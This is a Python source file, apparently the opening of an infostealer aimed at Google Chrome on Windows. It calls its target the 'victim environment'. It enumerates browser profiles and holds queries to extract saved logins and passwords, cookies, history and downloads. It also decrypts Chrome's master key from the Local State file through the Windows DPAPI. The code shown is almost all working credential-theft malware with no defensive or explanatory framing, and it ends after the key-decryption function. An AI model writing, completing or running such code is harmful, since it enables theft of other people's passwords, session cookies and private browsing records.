import os
import shutil
import base64
import json
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from typing import Dict,List

# Define the victim environment, and the path to the file to be stolen
class victimEnvironment:
    def __init__(self):
        self.appdataLocalPath = os.getenv("LOCALAPPDATA")
        self.browserPath:Dict[str, str] = {
            "chrome": f"{self.appdataLocalPath}\\Google\\Chrome\\User Data",
        }
        self.browserCredentialInformation:Dict[str, Dict[str, str]] = {
            "loginData": {
                "query": "SELECT action_url, username_value, password_value FROM logins",
                "subPath": "\\Login Data"
            },
            "cookies": {
                "query": "SELECT host_key, creation_utc, name, encrypted_value, "
                        + "path, expires_utc, is_secure, is_httponly, last_access_utc, "
                        + "has_expires, is_persistent, samesite, source_scheme FROM cookies",
                "subPath": "\\Network\\Cookies"
            },
            "history": {
                "query": "SELECT url, title, visit_count, typed_count, last_visit_time FROM urls",
                "subPath": "\\History"
            },
            "visitedLink": {
                "query": "SELECT top_level_url, frame_url, visit_count FROM visited_links",
                "subPath": "\\History"
            },
            "downloads": {
                "query": "SELECT current_path, target_path, referrer, start_time, end_time, total_bytes, last_access_time, mime_type, state, danger_type, interrupt_reason FROM downloads",
                "subPath": "\\History"
            }
        }

    # Under the "...\\User Data" directory, there are some profile directories like "Profile 1", "Profile 2", "Profile 3", ...
    def searchProfiles(self, browserPath: str) -> List[str]:
        directoryEntries:List[str] = os.listdir(browserPath)
        profileDirectories:List[str] = []
        for directory in directoryEntries:
            if directory.startswith("Profile "):
                profileDirectories.append(directory)
        return profileDirectories

    # Check if the browser is installed
    def checkBrowserInstallation(self) -> List[str]:
        existingBrowser:List[str] = []
        for browser in self.browserPath:
            if os.path.exists(self.browserPath[browser]):
                existingBrowser.append(browser)
            else:
                continue
        return existingBrowser

    # Get master key from the victim's environment
    def getMasterKey(self, browserPath: str) -> str:
        if not os.path.exists(browserPath):
            raise Exception(f"{browserPath} does not exist")
        
        localStatePath:str = f"{browserPath}\\Local State"
        if "os_crypt" not in open(localStatePath, "r", encoding = "latin-1").read():
            raise Exception(f"os_crypt not found in {localStatePath}")

        with open(localStatePath, "r", encoding = "latin-1") as localStateStream:
            c:bytes = localStateStream.read()
            localState:json = json.loads(c)
            masterKey:str = base64.b64decode(localState["os_crypt"]["encrypted_key"])
            masterKey = masterKey[5:]
            masterKey = CryptUnprotectData(masterKey, None, None, None, 0)[1]
            return masterKey